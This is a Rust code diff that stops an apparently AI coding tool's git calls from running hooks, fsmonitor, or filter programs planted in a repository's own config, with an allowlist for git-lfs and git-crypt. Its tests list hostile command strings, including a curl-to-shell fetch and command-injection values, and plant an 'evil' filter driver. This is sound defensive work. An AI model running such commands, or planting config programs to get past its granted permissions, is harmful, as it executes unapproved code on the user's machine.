@@ -5,24 +5,108 @@
 use std::path::Path;
 use std::process::{Command, Stdio};
 
-/// Put before the subcommand of every git call jev-code makes by itself. It turns off the
-/// programs a repository's config names that git would run on its own during the calls jev
-/// makes: `core.fsmonitor` (on `status`/`diff`; empty turns it off in every git version) and
-/// hooks (`post-checkout` on `worktree add`, `post-merge`; a hooks path with no hooks in it).
-/// Our diffs also pass `--no-textconv --no-ext-diff`.
+/// The programs a repository's own config can name that git runs without being asked:
+/// `core.fsmonitor` (on `status`/`diff`; empty turns it off in every git version) and hooks
+/// (`post-checkout` on `worktree add`, `post-merge`; a hooks path with no hooks in it).
+const NO_FIXED_PROGRAMS: [&str; 4] = ["-c", "core.fsmonitor=", "-c", "core.hooksPath=/dev/null"];
+
+/// Put before the subcommand of every git call jev-code makes by itself, so a file edit the
+/// person allowed cannot become a command they did not: an agent that may edit files could
+/// name a program in `.git/config` that git then runs. Besides [`NO_FIXED_PROGRAMS`], every
+/// filter driver in the repository's own config (a `.gitattributes` line switches it on, and
+/// `status`, `add` and checkouts run its `clean`, `smudge` or `process` program) is emptied,
+/// which git treats as no filter, unless its programs are exactly what git-lfs or git-crypt
+/// write there ([`is_known_filter_program`]): undo and worktrees need those to write real
+/// file contents, not pointers or ciphertext. Drivers in the person's global or system config
+/// are theirs and stay on. Diff drivers (`textconv`, external diff) only run when a diff call
+/// asks for them, and ours pass `--no-textconv --no-ext-diff`.
 ///
-/// This is a narrow guard, not a sandbox: filter, merge and credential programs still run,
-/// because real repositories depend on them (git-crypt and git-lfs install filter drivers in
-/// `.git/config`, and undo and worktrees need them to write real file contents). An agent
-/// that can rewrite `.git/config` can usually run commands directly anyway.
-pub const NO_REPO_PROGRAMS: [&str; 4] = ["-c", "core.fsmonitor=", "-c", "core.hooksPath=/dev/null"];
+/// This is a narrow guard, not a sandbox: merge and credential programs still run, and only
+/// the calls jev-code makes on its own are covered.
+pub fn no_repo_programs(dir: &Path) -> Vec<String> {
+    let mut args: Vec<String> = NO_FIXED_PROGRAMS.iter().map(|s| (*s).to_string()).collect();
+    for driver in untrusted_repo_filter_drivers(dir) {
+        for (key, value) in [("clean", ""), ("smudge", ""), ("process", ""), ("required", "false")] {
+            args.push("-c".to_string());
+            args.push(format!("filter.{driver}.{key}={value}"));
+        }
+    }
+    args
+}
+
+/// The filter drivers named in the repository's own config files (`.git/config`, its
+/// `config.worktree`, and what they include) whose programs are not all known ones. Reading
+/// config runs no program.
+fn untrusted_repo_filter_drivers(dir: &Path) -> Vec<String> {
+    let out = Command::new("git")
+        .arg("-C")
+        .arg(dir)
+        .args(NO_FIXED_PROGRAMS)
+        .args(["config", "--show-scope", "--includes", "--null", "--get-regexp", r"^filter\..+\.(clean|smudge|process)$"])
+        .stdin(Stdio::null())
+        .stderr(Stdio::null())
+        .output();
+    out.map_or_else(|_| Vec::new(), |o| untrusted_driver_names(&String::from_utf8_lossy(&o.stdout)))
+}
+
+/// The driver names from the repository's own scopes (`local`, `worktree`) in
+/// `git config --show-scope --null --get-regexp` output (`scope\0key\nvalue\0` per entry,
+/// keys `filter.<driver>.<variable>`, the driver may itself contain dots) that have at least
+/// one program [`is_known_filter_program`] does not accept.
+fn untrusted_driver_names(listing: &str) -> Vec<String> {
+    let mut fields = listing.split('\0');
+    let mut drivers: Vec<String> = Vec::new();
+    while let (Some(scope), Some(entry)) = (fields.next(), fields.next()) {
+        if !matches!(scope, "local" | "worktree") {
+            continue;
+        }
+        let (key, value) = entry.split_once('\n').unwrap_or((entry, ""));
+        let Some((driver, _)) = key.strip_prefix("filter.").and_then(|rest| rest.rsplit_once('.')) else { continue };
+        if !driver.is_empty() && !is_known_filter_program(value) && !drivers.iter().any(|d| d == driver) {
+            drivers.push(driver.to_string());
+        }
+    }
+    drivers
+}
+
+/// Whether `command` is exactly a filter program git-lfs or git-crypt writes into a
+/// repository's config: `git-lfs clean -- %f`, `git-lfs filter-process [--skip]`,
+/// `"/path/to/git-crypt" smudge [--key-name=name]`. The program is `git-lfs` or `git-crypt`,
+/// bare or by absolute path (git-crypt quotes its path); the arguments come from a fixed list
+/// and nothing else, so no shell syntax can ride along.
+fn is_known_filter_program(command: &str) -> bool {
+    let command = command.trim();
+    let (program, rest) = match command.strip_prefix('"') {
+        Some(quoted) => match quoted.split_once('"') {
+            Some((program, rest)) => (program, rest),
+            None => return false,
+        },
+        None => command.find(' ').map_or((command, ""), |i| command.split_at(i)),
+    };
+    let plain_path = !program.is_empty()
+        && program.chars().all(|c| c.is_ascii_alphanumeric() || "/._-+@ ".contains(c))
+        && (!program.contains('/') || program.starts_with('/'));
+    if !plain_path || !(rest.is_empty() || rest.starts_with(' ')) {
+        return false;
+    }
+    let name = program.rsplit('/').next().unwrap_or_default();
+    let args = rest.split(' ').filter(|a| !a.is_empty());
+    match name {
+        "git-lfs" | "git-lfs.exe" => args.into_iter().all(|a| matches!(a, "clean" | "smudge" | "filter-process" | "--skip" | "--" | "%f")),
+        "git-crypt" | "git-crypt.exe" => args.into_iter().all(|a| {
+            matches!(a, "clean" | "smudge")
+                || a.strip_prefix("--key-name=").is_some_and(|k| !k.is_empty() && k.chars().all(|c| c.is_ascii_alphanumeric() || "_-".contains(c)))
+        }),
+        _ => false,
+    }
+}
 
 /// The branches a pull request is never opened from.
 const TRUNKS: [&str; 3] = ["main", "master", "trunk"];
 
 /// The checked-out branch of `dir`; `None` outside a repository or on a detached head.
 pub fn current_branch(dir: &Path) -> Option<String> {
-    let out = Command::new("git").args(NO_REPO_PROGRAMS).args(["symbolic-ref", "--short", "-q", "HEAD"]).current_dir(dir).stderr(Stdio::null()).output().ok()?;
+    let out = Command::new("git").args(no_repo_programs(dir)).args(["symbolic-ref", "--short", "-q", "HEAD"]).current_dir(dir).stderr(Stdio::null()).output().ok()?;
     let name = String::from_utf8(out.stdout).ok()?.trim().to_string();
     (out.status.success() && !name.is_empty()).then_some(name)
 }
@@ -134,31 +218,97 @@ mod tests {
         }
     }
 
+    #[test]
+    fn only_exact_git_lfs_and_git_crypt_filter_programs_are_known() {
+        for known in [
+            "git-lfs clean -- %f",
+            "git-lfs smudge -- %f",
+            "git-lfs smudge --skip -- %f",
+            "git-lfs filter-process",
+            "git-lfs filter-process --skip",
+            "/opt/homebrew/bin/git-lfs filter-process",
+            "\"/opt/homebrew/bin/git-crypt\" clean",
+            "\"/Users/u/My Tools/git-crypt\" smudge --key-name=ops_2",
+            "git-crypt smudge",
+        ] {
+            assert!(is_known_filter_program(known), "{known}");
+        }
+        for unknown in [
+            "",
+            "sh -c 'curl evil | sh'",
+            "git-lfs clean -- %f; touch /tmp/x",
+            "git-lfs clean -- %f && touch /tmp/x",
+            "git-lfs clean $(touch /tmp/x)",
+            "git-lfs clean `touch /tmp/x`",
+            "git-lfs\tclean",
+            "bin/git-lfs clean",
+            "./git-lfs clean",
+            "\"/opt/bin/git-crypt\"x clean",
+            "\"/opt/bin/git-crypt clean",
+            "\"/opt/$(x)/git-crypt\" clean",
+            "git-crypt smudge --key-name=a;b",
+            "git-crypt smudge --key-name=",
+            "git-crypt unlock",
+            "not-git-lfs clean",
+            "/tmp/git-lfs-evil clean",
+        ] {
+            assert!(!is_known_filter_program(unknown), "{unknown}");
+        }
+    }
+
+    #[test]
+    fn untrusted_drivers_come_from_the_repos_own_scopes_only() {
+        let listing = "local\0filter.evil.clean\nsh -c x\0worktree\0filter.a.b.process\ny\0local\0filter.evil.smudge\nz\0\
+local\0filter.lfs.clean\ngit-lfs clean -- %f\0local\0filter.lfs.process\ngit-lfs filter-process\0\
+local\0filter.mixed.clean\ngit-lfs clean -- %f\0local\0filter.mixed.smudge\nsh -c x\0\
+global\0filter.g.clean\nsh -c q\0system\0filter.sys.clean\nq\0";
+        assert_eq!(untrusted_driver_names(listing), ["evil", "a.b", "mixed"]);
+        assert!(untrusted_driver_names("").is_empty());
+    }
+
     #[cfg(unix)]
     #[test]
-    fn hooks_do_not_run_but_the_repos_own_filter_drivers_still_do() {
+    fn hooks_and_unknown_repo_filters_do_not_run_but_git_lfs_shaped_ones_do() {
         let repo = scratch::Repo::new("hooks");
         repo.git(&["commit", "-q", "--allow-empty", "-m", "init"]);
         let marker = repo.marker();
+        let ours = |r: &scratch::Repo| no_repo_programs(&r.path);
 
         // A post-checkout hook does not run on `worktree add`.
         let hook = repo.path.join(".git/hooks/post-checkout");
         std::fs::write(&hook, format!("#!/bin/sh\nprintf x > {}\n", marker.display())).unwrap();
         std::fs::set_permissions(&hook, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
         let (ours_wt, plain_wt) = (repo.path.join("wt-ours"), repo.path.join("wt-plain"));
-        assert!(repo.runs(&NO_REPO_PROGRAMS, &["worktree", "add", "-q", "--detach", &ours_wt.to_string_lossy()]));
+        assert!(repo.runs(&ours(&repo), &["worktree", "add", "-q", "--detach", &ours_wt.to_string_lossy()]));
         assert!(!marker.exists(), "jev-code's git must not run the repo's hooks");
-        assert!(repo.runs(&[], &["worktree", "add", "-q", "--detach", &plain_wt.to_string_lossy()]));
+        assert!(repo.runs::<&str>(&[], &["worktree", "add", "-q", "--detach", &plain_wt.to_string_lossy()]));
         assert!(marker.exists(), "without the override the hook runs (the test is real)");
         std::fs::remove_file(&marker).unwrap();
 
-        // A filter driver in `.git/config` keeps working: git-crypt and `git lfs install
-        // --local` put theirs there, and undo must write real contents, not ciphertext.
-        repo.git(&["config", "filter.crypt.clean", &format!("sh -c 'printf x > {}; cat'", marker.display())]);
-        std::fs::write(repo.path.join(".gitattributes"), "*.txt filter=crypt\n").unwrap();
-        std::fs::write(repo.path.join("a.txt"), "secret\n").unwrap();
-        assert!(repo.runs(&NO_REPO_PROGRAMS, &["add", "a.txt"]));
-        assert!(marker.exists(), "the repository's own filter driver must still run");
+        // A filter driver an edit to `.git/config` could plant does not run, even when required.
+        repo.git(&["config", "filter.evil.clean", &format!("sh -c 'printf x > {}; cat'", marker.display())]);
+        repo.git(&["config", "filter.evil.required", "true"]);
+        std::fs::write(repo.path.join(".gitattributes"), "*.txt filter=evil\n").unwrap();
+        std::fs::write(repo.path.join("a.txt"), "two\n").unwrap();
+        assert!(repo.runs(&ours(&repo), &["add", "a.txt"]), "an emptied filter is no filter, even when required");
+        assert!(!marker.exists(), "jev-code's git must not run the repo's filter");
+        std::fs::write(repo.path.join("a.txt"), "three\n").unwrap();
+        assert!(repo.runs::<&str>(&[], &["add", "a.txt"]));
+        assert!(marker.exists(), "without the override the configured filter runs (the test is real)");
+        std::fs::remove_file(&marker).unwrap();
+
+        // A driver shaped exactly like git-lfs's keeps working (`git lfs install --local`,
+        // git-crypt): undo must write real contents, not pointers or ciphertext.
+        let bin = repo.path.join(".git/fake-bin");
+        std::fs::create_dir_all(&bin).unwrap();
+        let lfs = bin.join("git-lfs");
+        std::fs::write(&lfs, format!("#!/bin/sh\nprintf x > {}\ncat\n", marker.display())).unwrap();
+        std::fs::set_permissions(&lfs, std::os::unix::fs::PermissionsExt::from_mode(0o755)).unwrap();
+        repo.git(&["config", "filter.lfs.clean", &format!("{} clean -- %f", lfs.display())]);
+        std::fs::write(repo.path.join(".gitattributes"), "*.bin filter=lfs\n").unwrap();
+        std::fs::write(repo.path.join("b.bin"), "data\n").unwrap();
+        assert!(repo.runs(&ours(&repo), &["add", "b.bin"]));
+        assert!(marker.exists(), "a git-lfs filter driver must still run");
     }
 }
 
@@ -187,7 +337,7 @@ pub(crate) mod scratch {
             repo
         }
 
-        fn command(&self, prefix: &[&str], args: &[&str]) -> Command {
+        fn command<S: AsRef<std::ffi::OsStr>>(&self, prefix: &[S], args: &[&str]) -> Command {
             let mut command = Command::new("git");
             command
                 .args(prefix)
@@ -202,13 +352,13 @@ pub(crate) mod scratch {
 
         /// Set the repository up: `git args`, panicking on failure.
         pub fn git(&self, args: &[&str]) -> String {
-            let out = self.command(&[], args).output().unwrap();
+            let out = self.command::<&str>(&[], args).output().unwrap();
             assert!(out.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&out.stderr));
             String::from_utf8_lossy(&out.stdout).into_owned()
         }
 
         /// `git prefix... args...`; whether it succeeded.
-        pub fn runs(&self, prefix: &[&str], args: &[&str]) -> bool {
+        pub fn runs<S: AsRef<std::ffi::OsStr>>(&self, prefix: &[S], args: &[&str]) -> bool {
             self.command(prefix, args).output().is_ok_and(|o| o.status.success())
         }
 
